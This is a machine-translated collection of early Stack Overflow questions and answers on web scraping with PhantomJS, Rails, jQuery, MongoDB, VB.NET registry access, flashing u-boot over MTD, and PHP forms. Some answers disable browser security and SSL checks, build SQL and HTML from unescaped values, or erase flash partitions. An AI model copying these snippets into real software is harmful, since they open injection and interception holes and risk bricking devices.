                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoBAMAAAB+0KVeAAAAK3RFWHRDcmVhdGlvbiBUaW1lAFYgMzEgYXVnLiAyMDEyIDE3OjU4OjU1ICswMjAwWMdbPwAAAAd0SU1FB9wIHw8ABeoUyU4AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAEZ0FNQQAAsY8L/GEFAAAABlBMVEX///8AAABVwtN+AAAAXklEQVR42uWQUQ6AMAhD6Q3a+19WqsawwMf+NLEfy3iDlC7idTGQp/YglFAsUMqSwjlQOhN3mIMTHDq70SeEWBbt0EG8POWkDySvmCh/SssvNfwIfb+hFmgjFKPf6gDQBAQ368m09AAAAABJRU5ErkJggg=="
            >
        </p>
    </body>
</html> 
```

注意`<title>`标签是如何变化的，如何`border: 1px`变成`border: 0px`的，图像 URL 是如何转换为[数据 URI](http://www.ietf.org/rfc/rfc2397.txt)的。

例如，`<title>`在使用 Google Chrome 检查器检查文档时，可以观察到其中一些转换（内联 CSS 和标签）。

**编辑 3**：用页面上的资源（样式和图像）替换外部资源并删除 javascript 是一个简单的部分。困难的部分是在运行 javascript 之后计算 CSS 样式。

**编辑 4**也许这可以使用注入的 javascript 来完成（尽管仍然需要浏览器控制）？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T02:52:36.330

[PhantomJS](http://phantomjs.org/)是一个带有 JavaScript API 的无头（无 GUI）WebKit。正如我在问题中要求的那样，它可以在所有主要平台上运行。

它可以运行 Javascript 脚本来控制无 GUI 的网络浏览器。它有一个强大的 API，还有很多很多的例子。

在过去 2-3 天的空闲时间里，我为我的问题编写了解决方案，它完美地涵盖了所有需求。我还没有找到它不能工作的网页。

.

用法，命令行：

```
phantomjs save_as_html.js http://stackoverflow.com/q/12215844/584490 saved.html 
```

.

Javascript 允许`n`在其他所有内容加载后运行几秒钟，即使对于完全由 javascript 生成的网页，它也应该工作。

.

笔记：

*   在可能的情况下，XHR 加载资源优于 HTML5 的画布渲染，因为它减小了文件大小并防止质量损失（重用原始文件比任何事情都好）。

*   `<link>`和`<img>`标签保持在原位，`data:`在 href 和 src 属性中分别使用 URI，而不是 URL。也是如此`background-image`，在所有 DOM 节点上使用 getComputedStyle() 读取。

*   `<script>`标签和事件处理程序属性被删除。

*   `<link>`带有的标签`rel="alternative"`也被删除（也许它们不应该被删除，而是被固定为绝对 URL，如果是相对的）。

*   `<iframe>`当前未处理，其 src 属性设置为`about:blank`.

.

*当心所有跨站点脚本安全限制被解除，以便可以加载所有资源。确保在使用 Facebook 帐户的某些秘密凭据时不要尝试保存恶意网页 :)。*

.

**`save_as_html.js`**内容：

 `````
//http://stackoverflow.com/a/12256190/584490

var page = require('webpage').create();
page.onConsoleMessage = function (msg) { console.log(msg); };

var system = require('system');
var address, output, size;

if (system.args.length!=3)
{
    console.log('Usage: save_as_html.js URL filename');
    phantom.exit(1);
}
else
{
    address = system.args[1];
    output = system.args[2];

    page.viewportSize = {    
        width: 1680, 
        height: 1050,
    };

    //SECURITY_ERR: DOM Exception 18: An attempt was made to break through the security policy of the user agent.
    //Enable cross site scripting:
    page.settings.XSSAuditingEnabled=false;
    page.settings.localToRemoteUrlAccessEnabled=true;
    page.settings.webSecurityEnabled=false;

    page.settings.userAgent="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1";
    page.settings.ignoreSslErrors=true;

    page.open(address, function (status){
        if (status!=='success')
        {
            console.log("Unable to load URL, returned status: "+status);
            phantom.exit(1);
        }
        else
        {
            window.setTimeout(function (){
                page.evaluate(function(){
                    var nodeList=document.getElementsByTagName("*");

                    var arrEventHandlerAttributes=[
                        "onblur", "onchange", "onclick", "ondblclick", "onfocus", "onkeydown", "onkeyup", "onkeypress", "onkeyup","onload",
                        "onmousedown", "onmousemove", "onmouseout", "onmouseover", "onmouseup", "onreset", "onselect", "onsubmit", "onunload"
                    ];

                    //http://stackoverflow.com/a/7372816/584490
                    var base64Encode=function(str)
                    {
                        var CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                        var out = "", i = 0, len = str.length, c1, c2, c3;
                        while (i < len) {
                            c1 = str.charCodeAt(i++) & 0xff;
                            if (i == len) {
                                out += CHARS.charAt(c1 >> 2);
                                out += CHARS.charAt((c1 & 0x3) << 4);
                                out += "==";
                                break;
                            }
                            c2 = str.charCodeAt(i++);
                            if (i == len) {
                                out += CHARS.charAt(c1 >> 2);
                                out += CHARS.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
                                out += CHARS.charAt((c2 & 0xF) << 2);
                                out += "=";
                                break;
                            }
                            c3 = str.charCodeAt(i++);
                            out += CHARS.charAt(c1 >> 2);
                            out += CHARS.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
                            out += CHARS.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >> 6));
                            out += CHARS.charAt(c3 & 0x3F);
                        }
                        return out;
                    };

                    for(var n=nodeList.length-1; n>0; n--)
                    {
                        try
                        {
                            var el=nodeList[n];

                            if(el.nodeName=="IMG" && el.src.substr(0, 5)!="data:")
                            {
                                /*var canvas=document.createElement("canvas");

                                canvas.width=parseInt(el.width);
                                canvas.height=parseInt(el.height);

                                var ctx=canvas.getContext("2d");
                                ctx.drawImage(el, 0, 0);
                                el.src=canvas.toDataURL();*/

                                var xhr=new XMLHttpRequest();

                                xhr.open(
                                    "get",
                                    el.src,
                                    /*Asynchronous*/ false
                                );

                                xhr.overrideMimeType("text/plain; charset=x-user-defined");

                                xhr.send(null);

                                var strResponseContentType=xhr.getResponseHeader("Content-type").split(";")[0].replace(/[^a-z0-9\/-]/gi, "");
                                el.src="data:"+strResponseContentType+";base64,"+base64Encode(xhr.responseText);
                            }
                            else if(el.nodeName=="LINK")
                            {
                                if(el.rel=="alternate")
                                {
                                    el.parentNode.removeChild(el);
                                }
                                else if(el.href.substr(0, 5)!="data:")
                                {
                                    var xhr=new XMLHttpRequest();

                                    xhr.open(
                                        "get",
                                        el.href,
                                        /*Asynchronous*/ false
                                    );

                                    xhr.overrideMimeType("text/plain; charset=x-user-defined");

                                    xhr.send(null);

                                    //var strResponseContentType=xhr.getResponseHeader("Content-type").split(";")[0].replace(/[^a-z0-9\/-]/gi, "");
                                    //el.href="data:"+strResponseContentType+";base64,"+base64Encode(xhr.responseText);
                                    el.href="data:"+el.type+";base64,"+base64Encode(xhr.responseText);
                                }

                                continue;
                            }
                            else if(el.nodeName=="SCRIPT")
                            {
                                el.parentNode.removeChild(el);

                                continue;
                            }
                            else if(el.nodeName=="IFRAME")
                            {
                                el.src="about:blank";

                                continue;
                            }

                            for(var z=arrEventHandlerAttributes.length-1; z>=0; z--)
                                el.removeAttribute(arrEventHandlerAttributes[z]);

                            var strBackgroundImageURL=window.getComputedStyle(el).getPropertyValue("background-image").replace("/[\s]/g", "");
                            if(strBackgroundImageURL.substr(0, 4)=="url(" && strBackgroundImageURL.substr(4, 5)!="data:")
                            {
                                strBackgroundImageURL=strBackgroundImageURL.substr(4, strBackgroundImageURL.length-5);

                                /*var imageTemp=document.createElement("img");
                                imageTemp.src=strBackgroundImageURL;

                                imageTemp.onload=function(e){
                                    var canvas=document.createElement("canvas");

                                    canvas.width=parseInt(imageTemp.width);
                                    canvas.height=parseInt(imageTemp.height);

                                    var ctx=canvas.getContext("2d");
                                    ctx.drawImage(imageTemp, 0, 0);
                                    el.style.backgroundImage="url("+canvas.toDataURL()+")";
                                };

                                if (imageTemp.complete)
                                    imageTemp.onload();
                                */

                                var xhr=new XMLHttpRequest();

                                xhr.open(
                                    "get",
                                    strBackgroundImageURL,
                                    /*Asynchronous*/ false
                                );

                                xhr.overrideMimeType("text/plain; charset=x-user-defined");

                                xhr.send(null);

                                var strResponseContentType=xhr.getResponseHeader("Content-type").split(";")[0].replace(/[^a-z0-9\/-]/gi, "");
                                el.style.backgroundImage="url("+"data:"+strResponseContentType+";base64,"+base64Encode(xhr.responseText)+")";
                            }

                            if(el.nodeName=="A")
                            {
                                el.href="#";//TODO convert relative paths to absolute ones (keep URLs);
                                el.setAttribute("onclick", "return false;");//TODO: remove this when the above is fixed.
                            }
                            else if(el.nodeName=="FORM")
                            {
                                el.setAttribute("action", "");
                                el.setAttribute("onsubmit", "return false;");
                            }
                        }
                        catch(error)
                        {
                            //what can be done about it?
                        }
                    }
                });

                require("fs").write(output, page.content, "w");

                phantom.exit();
            }, 1000);
        }
    });
} 
`````

# iphone - 如何覆盖 iPhone 的键盘

> ID：12215846
> 
> 赞同：1
> 
> 时间：2012-08-31T12:57:39.943
> 
> 标签：iphone, objective-c, keyboard, overriding, cydia

我想更改 iPhone/iPad 的颜色，并且我知道在 cydia 应用程序中它可能在越狱设备中检查此 URL：[http](http://www.youtube.com/watch?v=rcnJ2YXLqtM)
://www.youtube.com/watch?v= rcnJ2YXLqtM 请分享您重新研磨 cydia 的知识应用，

任何帮助是极大的赞赏。请携手..！

提前致谢。，

# ruby-on-rails - 回形针：样式别名

> ID：12215847
> 
> 赞同：0
> 
> 时间：2012-08-31T12:57:45.833
> 
> 标签：ruby-on-rails, paperclip

有没有办法在回形针中定义样式别名（相同的转换，相同的文件路径）？

```
# in the model
has_attached_file :image, {
  :styles => {
    :thumb => "90x90>",
    :small => :thumb
  }
  [...]
}

# in the application
model.image.url(:thumb)
=> 'path/to/image/thumb.jpg'

model.image.url(:small)
=> 'path/to/image/thumb.jpg' 
```

我目前正在重构一个有很多重复样式的应用程序。我希望它定义一次，而不破坏接口。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T19:14:31.280

这是要在初始化程序中添加的补丁：

```
module Paperclip
  Options.class_eval do
    attr_accessor :aliases

    def initialize_with_alias(attachment, hash)
      @aliases = hash[:aliases] || {}
      initialize_without_alias(attachment, hash)
    end

    alias_method_chain :initialize, :alias
  end

  Attachment.class_eval do
    def url_with_patch(style_name = default_style, use_timestamp = @options.use_timestamp)
      style_name = @options.aliases[style_name.to_sym] if @options.aliases[style_name.to_sym]
      url_without_patch(style_name, use_timestamp)
    end

    alias_method_chain :url, :patch
  end
end 
```

以这种方式使用它：

```
has_attached_file :image, {
  :styles => {
    :thumb => "90x90>"
  }
  :aliases => { :small => :thumb }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-10-14T10:49:17.293

[我对apneadiving](https://stackoverflow.com/a/12221311/575732)代码进行了一些更改以在version 中运行`~ 4`。

```
module Paperclip
  Attachment.class_eval do
    def url_with_filter_aliases(style_name = default_style, options = {})
      style_name = find_alias(style_name) if find_alias(style_name).present?
      url_without_filter_aliases(style_name, options)
    end

    alias_method_chain :url, :filter_aliases

    private

    def find_alias(style_name)
      return if @options.blank?

      @options.dig(:aliases, style_name)
    end
  end
end 
```

以同样的方式使用它：

```
has_attached_file :image, {
  :styles => {
    :thumb => "90x90>"
  }
  :aliases => { :small => :thumb }
} 
```

# jquery - 在元素悬停时更改 html 标记

> ID：12215851
> 
> 赞同：1
> 
> 时间：2012-08-31T12:57:53.960
> 
> 标签：jquery, html

我有一个`<div>`完整的`<ul>`元素。当我将鼠标悬停在其中一个元素上时，我想对 html 标记进行调整。

我的标准`<ul>`物品如下所示：

```
<ul>
    <li class="category"><img src="source" /></li>
    <li class="time days"><p>text</p></li>
    <li class="participant participant_one"><p><img src="source" />text</p></li>
    <li class="divider"><p>:</p></li>
    <li class="participant participant_two"><p><img src="source" />text</p></li>
    <li class="event_type"><p>Event</p></li>
    <li class="event_name"><p>text</p></li>
    <li class="hot"><p>945°</p></li>
    <li class="rating"><p>4.99</p></li>
    <li class="comments"><p>7.544</p></li>
    <li class="marked"></li>
</ul> 
```

现在悬停我希望这个元素看起来像这样：

```
<ul class="expanded">
    <li class="category"><img src="img/headlines_category_icon_1.png"></li>
    <li class="time days"><p>29.05</p></li>
    <li class="icon participant_one_icon"><img src="img/user_icon_36-36_1.png"></li>
    <li class="icon participant_two_icon"><img src="img/user_icon_36-36_1.png"></li>
    <li class="headline">
        <ul>
            <li class="participant participant_one"><p>Text</p></li>
            <li><p>:</p></li>
            <li class="participant participant_two"><p>Text</p></li>
        </ul>
        <p><span>Event</span> Eventname</p>
    </li>
    <li class="actions">
        <ul class="actions_ul">
            <li class="bookmark"><a href="#">Bookmark</a></li>
            <li class="comment"><a href="#">Comment</a></li>
            <li class="share"><a href="#">Share</a></li>
        </ul>
    </li>
</ul> 
```

我想使用 jquery 来完成此操作，我尝试了以下操作：

```
$('div.match_entries ul').mouseenter(function() {
    $(this).addClass('expanded');
    category = $(this).children('li.category');
    time = $(this).children('li.time');
    participant_one_original = $(this).children('li.participant_one');
    participant_one_icon = $(this).children('li.participant_one img');
    participant_one = $(this).children('li.participant_one').remove('img');
    participant_two_original = $(this).children('li.participant_two');
    participant_two_icon = $(this).children('li.participant_two img');
    participant_two = $(this).children('li.participant_two').remove('img');
    divider = $(this).children('li.divider');
    event_type_original = $(this).children('li.event_type');
    event_type = $(this).children('li.event_type p').text();
    event_name_original = $(this).children('li.event_name');
    event_name = $(this).children('li.event_name p').text();
    hot = $(this).children('li.hot');
    rating = $(this).children('li.rating');
    comment = $(this).children('li.comment');
    marked = $(this).children('li.marked');

    $(this).empty();

    $(this).append($(category));
    $(this).append($(time));
    $(this).append('<li class="icon participant_one_icon'+$(participant_one_icon)+'</li>');
    $(this).append('<li class="icon participant_two_icon'+$(participant_two_icon).text()+'</li>');
    $(this).append('<li class="headline"><ul>'+$(participant_one)+'<li><p>:</p></li>'+$(participant_two)+'</ul><p><span>'+$(event_type)+'</span> '+$(event_name)+'</p></li>');

}).mouseleave(function(){
    $(this).removeClass('expanded');
    $(this).empty();
    // APPEND ORIGINAL STUFF
}) 
```

不太好用......`$(category)`并`$(time)`以正确的方式附加，但其他的被包括在内`object Object`

有什么提示吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T13:07:49.330

如果你有这样的信息要在悬停时更改，也许你应该考虑直接让扩展版本有一个隐藏的，所以悬停时你只需隐藏原来的，然后显示隐藏的。

```
<ul class="original">
   <li> ... <li>
   <li> ... <li>
</ul>

<ul class="hidden">
   <li> ... <li>
   <li> ... <li>
</ul> 
```

JS部分

```
$('body').on('mouseenter','ul.original',function() {
   $(this).addClass('hidden')
          .next().removeClass('hidden');
}).on('mouseleave', 'ul.original', function(){
   $(this).removeClass('hidden')
          .next().addClass('hidden');
}); 
```

CSS

```
.hidden { display: none; } 
```

# mongodb - mongodb-从列表中的 id 访问记录

> ID：12215852
> 
> 赞同：2
> 
> 时间：2012-08-31T12:58:03.010
> 
> 标签：mongodb

我使用 mongodb 作为我的后端。我必须在每个文档的列表中存储类似的文档 ID。这是我收藏中的示例记录。

```
{
   "_id": ObjectID("...."),
   "doc_name": "my_doc1",
   "doc_id": "doc_id_1",
   "similar_docs": ["doc_id_6", "doc_id_86", "doc_id_93"],
   "more_fields": "..."
} 
```

这样我就可以跟踪每个文档的相似文档。现在我希望为给定文档的所有类似文档提供完整的 json。现在，我正在使用 for 循环在 doc_id 列表上为每个 doc_id 向数据库发出请求来实现它。有什么微妙的方法可以完成这项工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T13:00:32.927

您可以有一个查询，类似于以下内容：

```
db.collection.find({_id: {$in: [doc_id1, doc_id2, ..]}}); 
```

但是，如果您想要一种在查询父文档时以某种方式将这些 id 以某种方式“扩展”到文档中，那么您就无法做到这一点。除非您**将**完整文档存储在该数组中（这可能很昂贵或不可能（如果生成的文档超过最大文档大小））。

# vb.net - VB2010 当我尝试拉注册表项时它出现空白

> ID：12215857
> 
> 赞同：0
> 
> 时间：2012-08-31T12:58:27.113
> 
> 标签：vb.net, registry

好的，我正在尝试提取一个注册表条目，但它不起作用，每次我尝试它都会拉出一个空值。我尝试以管理员身份运行单个 exe 以仔细检查权限。我创建了一个执行相同功能的批处理文件，它运行良好，我还使用相同的方法在脚本的其他部分提取注册表值，但似乎找不到问题。程序运行良好并显示 0 个错误。

源代码：

```
' Check Auto Update settings
        Dim AUOptions_Value = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update", "AUOptions", Nothing)
        Dim AUOptions_level
        If AUOptions_Value = 4 Then
            AUOptions_level = "Auto Update Options set to: Install Updates Automatically."
            Display_AUOptions.ForeColor = Color.Green
        ElseIf AUOptions_Value = 3 Then
            AUOptions_level = "Download Updates but let me choose whether to install them."
            Display_AUOptions.ForeColor = Color.Blue
        ElseIf AUOptions_Value = 2 Then
            AUOptions_level = "Check for updates but let me choose whether to download them and install them."
            Display_AUOptions.ForeColor = Color.Blue
        ElseIf AUOptions_Value = 1 Then
            AUOptions_level = "Never check for updates."
            Display_AUOptions.ForeColor = Color.Red
        Else
            AUOptions_level = "Unable to detect settings"
            Display_AUOptions.ForeColor = Color.Red
        End If
        Display_AUOptions.Text = AUOptions_level
    End Sub 
```

注册表项：

```
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update]
"AUOptions"=dword:00000004 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:55:46.937

我想您正在为 x86 编译应用程序并在 64 位操作系统上对其进行测试。在这种情况下，对注册表的每次读取都会由操作系统自动重定向到注册表的不同子树。[请参阅注册表中有关 32 位和 64 位应用程序数据的](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724072%28v=vs.85%29.aspx)MSDN

操作系统将您的注册表路径更改为此

```
"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\" & _
"Windows\CurrentVersion\WindowsUpdate\Auto Update" 
```

请注意操作系统如何更改子树添加`Wow6432Node`. 这就是您的问题，在 64 位操作系统上`WindowsUpdate`，`Wow6432Node`. （没错，因为这些设置是由 64 位操作系统管理的）

要解决您的问题，请尝试为`AnyCPU`或编译您的应用程序`x64`

# linux - 从 i.MX51 中的内核升级 u-boot

> ID：12215859
> 
> 赞同：0
> 
> 时间：2012-08-31T12:58:38.280
> 
> 标签：linux, linux-kernel, embedded-linux

我正在研究带有 NAND 闪存的 i.MX35 Freescale 板。我正在尝试从内核升级 u-boot。我在网上搜索，但在那里我没有得到太多细节

这有可能做到这一点，我该怎么做？有人可以提供必要的命令和程序来做到这一点吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T15:04:40.487

如果不了解更多关于内核配置的信息，就很难就此提供建议。

由于您似乎正在从 NAND 引导系统，因此我假设您的内核是使用 mtd 支持构建的——尽管系统完全有可能从 NAND 引导 u-boot，然后从其他地方引导内核和根文件系统。

我的经验是使用带有 Micron NAND 闪存的 OMAP2 板，但一般步骤应该是相同的。除了尝试之外，似乎没有特别好的文档来源。

1：运气好的话，你的 NAND 被分区并且 mtd 子系统编译到你的内核子系统中，它在 NAND 上找到了分区（大小在内核引导行中指定，或者可能在你的板文件中以编程方式指定）。

在启动时的控制台上，您可能会看到如下内容：[警告：某些日志记录可能被禁用]

```
[    1.670471] Creating 5 MTD partitions on "omap2-nand.0":
[    1.676086] 0x000000000000-0x000000020000 : "xload"
[    1.684814] 0x000000020000-0x0000000a0000 : "barebox"
[    1.692626] 0x0000000a0000-0x0000000c0000 : "bareboxenv"
[    1.700622] 0x0000000c0000-0x0000004c0000 : "kernel"
[    1.709899] 0x0000004c0000-0x000040000000 : "root" 
```

请注意，我在这里使用的是 OMAP2 系统，使用 Barebox 而不是 u-boot，但同样适用。这里我们有主加载程序分区`xload`、主引导加载程序`barebox`、barebox ( ) 的非易失性存储`bareboxenv`、内核和根文件系统。

2：如果是这样，你会发现这些分区中的每一个都有一个dev文件`/dev`

```
root@fk-00A0DE4648fe:~# ls /dev/
block               mtd4                tty11               tty49
bus                 mtd4ro              tty12               tty52
char                mtdblock0           tty13               tty50
console             mtdblock1           tty14               tty51
core                mtdblock2           tty15               tty520
cpu_dma_latency     mtdblock3           tty16               tty53trl
disk                mtdblock4           tty17               tty54om 
```

这些`mtdblock`文件是原始块设备，对应于步骤 1 中的分区

3：您可以使用`mtdinfo -a`更多信息：

```
....
Name:                           barebox
Type:                           nand
Eraseblock size:                131072 bytes, 128.0 KiB
Amount of eraseblocks:          4 (524288 bytes, 512.0 KiB)
Minimum input/output unit size: 2048 bytes
Sub-page size:                  2048 bytes
OOB size:                       64 bytes
Character device major/minor:   90:2
Bad blocks are allowed:         true
Device is writable:             true
.... 
```

4：您可以擦除一个分区（例如block1）：

`mtd_debug erase /dev/mtdblock1 0x0 0x8000`

这两个地址是从块开始的偏移量和要擦除的长度

5：复制你的图像到新擦除的闪存

`cp <uboot_image> /dev/mtdblock1`

这似乎对我有用，尽管大多数 NAND 闪存具有非常特定的编程大小——尽管这些可能是块的倍数，这可能令人惊讶。

`mtd_debug`还提供了`read`和`write`动词——它们完全符合你的想象。我在这些方面的成功不如在`cp`

显然，在尝试此操作之前，您需要一个方便的替代引导安排（可能是 MMC 卡）并经过验证可以正常工作，因为如果闪存编程不起作用，您的系统很可能在之后无法启动。

对我来说出错并证明是痛苦的事情是用于分区的不同 ECC 算法。闪存的前几个擦除单元通常保证更健壮，并且将使用 SoC 中掩码 PROM 中最小初始加载程序支持的任何 ECC。这很可能不是您在设备的其余部分上使用的——当然不是我正在使用的美光部件。

这将意味着引导加载程序和内核在不进行一些修改的情况下可能无法读取和写入彼此的分区。

# php - 如果在 mysql 中加入 PHP Codeigniter

> ID：12215862
> 
> 赞同：-1
> 
> 时间：2012-08-31T12:58:48.390
> 
> 标签：php, mysql, codeigniter, if-statement

我试图这样做：

在控制器中我做了：

```
foreach($troublesome_pupil as $u)
array_push($bad_pupils,$u->id) 
```

我将 $bad_pupils 发送到我的模型并在查询之前发送：

```
$bad_pupils = implode(',', $bad_pupils);

Select user.name from user
IF (user.id NOT IN '$bad_pupils')
JOIN `marksheet` ON marksheet.id = user.id
JOIN `holiday` ON holiday.id = user.id
ENDIF 
```

基本上 $bad_pupils 是一个数组，所以我检查该数组中的用户 ID（我已经使用 implode 处理了数组）如果找到则只加入两个表，否则继续

另外，如果在我的选择语句中说示例：我有

```
select (user.name , marksheet.marks) .. 
```

如果该行在 IF 语句中被跳过，那么该行的标记列的值是多少？

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T16:33:32.723

你能用这个吗？

```
 SELECT user.name, marksheet.marks, holiday.holiday 
      FROM user
 LEFT JOIN marksheet ON marksheet.id = user.id AND user.id NOT IN ($bad_pupils)
 LEFT JOIN holiday ON holiday.id = user.id AND user.id NOT IN ($bad_pupils) 
```

# javascript - 提交后保留单选按钮中的值

> ID：12215865
> 
> 赞同：0
> 
> 时间：2012-08-31T12:58:52.513
> 
> 标签：javascript, jquery, ajax, radio-button

我正在构建一个带有单选按钮的表单。

```
<form id="land" name="input" method="POST" action="test.php">
    <input type="radio" name="Albania" value="Albania" class="test">
    <input type="radio" name="Sweden" value="Sweden" class="test">
    <input type="radio" name="Norway" value="Norway" class="test">
    .....
    <input type="hidden" name="hidden" value="action">
    <input type="submit" value="Submit">
</form> 
```

有超过 150 个国家可供选择。当你选择一个国家时，我正在构建的应用程序会显示一个折线图，代表相关国家的数据。我已经构建了一个脚本，以便我可以有多种选择。基本上，它会构建一个包含选定值的数组，然后从内爆数组构建一个 SQL 查询。

当我使用提交按钮发送数据时，这工作正常。但我希望图表在用户选中单选按钮时直接更新。我添加了

```
onClick='this.form.submit()' 
```

到输入字段，这工作正常。

我的问题是我现在不能选择两个值，例如挪威和瑞典来比较这两个值，因为一旦我选中一个单选按钮，页面就会加载并且值消失并且单选按钮未选中。

所以。如何在值不消失的情况下发送查询？

非常感谢任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:06:09.867

```
<input <?php if (!(strcmp($_POST['Albania'],"Albania"))) {echo 'checked="checked"';} ?> type="radio" name="Albania" value="Albania" class="test">
<input <?php if (!(strcmp($_POST['Sweden'],"Sweden"))) {echo 'checked="checked"';} ?> type="radio" name="Sweden" value="Sweden" class="test">
<input <?php if (!(strcmp($_POST['Norway'],"Norway"))) {echo 'checked="checked"';} ?> type="radio" name="Norway" value="Norway" class="test"> 
```

但是你为什么不使用复选框呢？也许用户要取消选中其中一个无线电输入。

我建议您将单选按钮的名称更改为：`name="country[countryName]"` 通过执行以下操作更容易检索所选国家/地区`implode()`

```
<input <?php if (in_array("Albania", $_POST['country'])) {echo 'checked="checked"';} ?> type="radio" name="country[Albania]" value="Albania">
<input <?php if (in_array("Sweden", $_POST['country'])) {echo 'checked="checked"';} ?> type="radio" name="country[Sweden]" value="Sweden">
<input <?php if (in_array("Norway", $_POST['country'])) {echo 'checked="checked"';} ?> type="radio" name="country[Norway]" value="Norway"> 
```

生成单选按钮：

```
<?php while($row = mysql_fetch_array($sth)) { ?> 
<input class="className" type="radio" name="country[<?php echo $row['land']; ?>]" value="<?php echo $row['land'];?>" onClick='this.form.submit()' <?php if (in_array($row['land'], @$_POST['country'])) {echo 'checked="checked"';} ?> /><?php echo $row['land'];?> 
<?php }?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:07:40.133

我不认为这是一个问题。这正是 HTML 和浏览器的工作方式。如果您使用 Ajax 调用而不是提交表单（并因此重新加载页面），则将保留所有选择的选项。如果您希望提交并重新加载页面以便执行您的服务器代码，您将需要创建一个或多个服务器变量来保存用户选择的选项。在 UI 中，在呈现表单和单选按钮时，您需要检查是否选择了选项并使用“checked”属性，例如：

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T13:52:58.680

```
<script type="text/javascript">
    $(document).ready(function ()
    {
        $('input[type="radio"]').click(function ()
        {
            var values = "";
            $('input[type="radio"]:checked').each(function ()
            {
                values = values + " - " + $(this).val();
            });
            alert(values);
            // Send your query here..
        });
    });
</script> 
```

# browser-history - Web开发中的后退按钮

> ID：12215866
> 
> 赞同：-1
> 
> 时间：2012-08-31T12:58:53.327
> 
> 标签：browser-history, html5-history

在`history.back`javascript 中不起作用。像这样。

我的场景：

要求`page1 > page2 > page3 > page4`

处理`page4`(redirect to) >中的东西`page2`，现在我想要`page2`重定向到的后退按钮`page1`。

**问题**

我们如何实现这一点？

我可以搜索这个问题的关键字是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:02:07.623

window.history.back() 应该可以工作。请问您可以发布您的代码吗？请注意，为了使这个工作 page1 需要在浏览器的“历史”中。确保当您导航到第 2 页并单击浏览器的后退按钮时，您将被重定向到第 1 页。window.history.back() 与浏览器的后退按钮相同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-05T23:17:45.263

当 JavaScript 打开时，这应该总是有效的：

```
<a href="javascript: history.go(-1)">Back</a> 
```

要返回 2 页，只需更改`-1`为`-2`：

```
<a href="javascript: history.go(-2)">Back 2 pages</a> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-07T06:44:02.737

您可以只重定向到**page1**：

```
<a href="javascript: window.location.href="pages1.html">Back</a> 
```

# json - Ext GWT - 使用 JSON 进行网格分页，将我的所有记录编号设置为分页

> ID：12215872
> 
> 赞同：0
> 
> 时间：2012-08-31T12:59:12.857
> 
> 标签：json, gwt, paging, gxt

我正在使用 Ext GWT。我有一个带有分页和 JSON 的网格。

我不明白，我在哪里可以在分页配置中设置所有记录数。

我的分页网格是错误的，因为它不知道数据库表中有多少条记录。

谢谢

```
String path =  GWT.getHostPageBaseURL() + (Examples.isExplorer() ? "" : "../../" ) + "backend/index.php?action=getLines";  

RequestBuilder builder = new RequestBuilder(RequestBuilder.GET, path);  
HttpProxy<String> proxy = new HttpProxy<String>(builder);  

JsonPagingLoadResultReader<PagingLoadResult<ModelData>> reader = new JsonPagingLoadResultReader<PagingLoadResult<ModelData>>(type);  

final PagingLoader<PagingLoadResult<ModelData>> loader = new BasePagingLoader<PagingLoadResult<ModelData>>(proxy,  
    reader);

[...]

final PagingToolBar toolBar = new PagingToolBar(10);  
toolBar.bind(loader);  

loader.load(0, 10); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T21:42:15.377

您的总计数应该出现在您的请求响应中，并将成为 PagingLoadResult 的一部分。我通常不使用任何阅读器，因此我必须创建自己的 PagingLoadResult，此时您将传递总数。通常，我将使用 RpcProxy，放弃使用任何阅读器，并完成将 PagingLoadResult 放在 RpcProxy 中的繁重工作。

```
@Override
public void load(PagingLoadConfig loadConfig,
        final AsyncCallback<PagingLoadResult<?>> callback) {
    [some async service call](..., new AsyncCallback<String>() {

                @Override
                public void onSuccess(String result) {
                  // Get info from your result and construct paged result
                  PagingLoadResult<?> pagedResult = new ...
                  callback.onSuccess(pagedResult)
                }

                @Override
                public void onFailure(Throwable caught) {
                }

} 
```

# android - 从 EditText 读取图像

> ID：12215876
> 
> 赞同：0
> 
> 时间：2012-08-31T12:59:32.470
> 
> 标签：android, android-edittext

我正在从 xml 读取数据并将其设置为`EditText`查看。这里的数据也包含图像。我可以使用 html.fromHtml() 方法在 EditText 视图中显示数据。

问题是当我从 EditText 获取数据并将其存储在一个字符串中时，当我将该字符串设置为另一个 TextView 时，我没有获取图像。
我正在阅读使用

```
 string s=editextview.gettext(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:20:57.483

我想我明白了你的问题。如果您尝试读取包含文本和图像的 xml 文档（例如 HTML 文件），请确定您有多少图像。布局中的 ImageView 与 xml 中的图像数量一样多（动态添加）。在 EditText 或 Text View 中显示文本（取决于您想要的方式）。您必须对其进行格式化。

